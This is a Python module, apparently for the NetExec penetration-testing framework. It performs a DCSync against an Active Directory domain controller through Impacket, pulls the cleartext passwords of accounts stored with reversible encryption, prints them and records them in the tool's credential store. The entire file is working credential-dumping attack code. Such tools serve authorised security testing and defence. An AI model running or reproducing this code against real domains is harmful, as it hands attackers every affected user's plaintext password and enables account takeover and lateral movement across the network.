from impacket.examples.secretsdump import NTDSHashes

from nxc.helpers.misc import CATEGORY


class NXCModule:
    name = "reversible-passwords"
    description = "Recover the cleartext password of accounts stored with reversible encryption (Primary:CLEARTEXT, via DCSync)"
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """No options."""

    def on_admin_login(self, context, connection):
        connection.enable_remoteops()

        found = []
        ntds = NTDSHashes(
            None,
            connection.bootkey,
            isRemote=True,
            noLMHash=True,
            remoteOps=connection.remote_ops,
            useVSSMethod=False,
            justNTLM=False,
            pwdLastSet=False,
            resumeSession=None,
            outputFileName=None,
            printUserStatus=False,
            perSecretCallback=lambda secret_type, secret: found.append(secret) if secret_type == NTDSHashes.SECRET_TYPE.NTDS_CLEARTEXT else None,
        )

        context.log.display("Replicating supplemental credentials over DRSUAPI to recover reversible cleartext passwords, this could take a while...")
        try:
            ntds.dump()
        except Exception as e:
            context.log.fail(f"DCSync failed (replication rights required): {e}")
            return
        finally:
            try:
                connection.remote_ops.finish()
            except Exception as e:
                context.log.debug(f"RemoteOperations cleanup returned: {e}")

        if not found:
            context.log.display("No account stores its password with reversible encryption")
            return

        context.log.success(f"Recovered {len(found)} reversible cleartext password(s):")
        for secret in found:
            context.log.highlight(secret)
            # Impacket emits the line as "domain\user:CLEARTEXT:password"
            identity, _, password = secret.partition(":CLEARTEXT:")
            domain, _, username = identity.rpartition("\\")
            if username:
                connection.db.add_credential("plaintext", domain or connection.domain, username, password)
